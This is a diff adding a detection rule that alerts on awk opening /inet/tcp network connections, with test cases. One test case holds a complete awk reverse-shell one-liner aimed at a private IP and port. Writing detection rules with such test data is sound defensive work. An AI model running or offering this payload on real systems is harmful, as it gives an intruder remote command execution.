@@ -1,0 +1,20 @@
+name: rta_awk_inet_tcp_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "awk" &&
+    re_match(e.process_args, "/inet/tcp/[0-9]/[0-9.]+/[0-9]+")
+  )
+tests:
+  - cleartext: "awk /inet/tcp reverse shell"
+    process_name: awk
+    process_args: "awk 'BEGIN{s=\"/inet/tcp/0/10.10.10.10/4444\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")close(s)}}'"
+    should_match: true
+  - cleartext: "awk inet tcp connection"
+    process_name: awk
+    process_args: "awk 'BEGIN{print \"test\" |& \"/inet/tcp/0/192.168.1.1/8080\"}'"
+    should_match: true
+  - cleartext: "normal awk processing"
+    process_name: awk
+    process_args: "awk '{print $1}' file.txt"
+    should_match: false
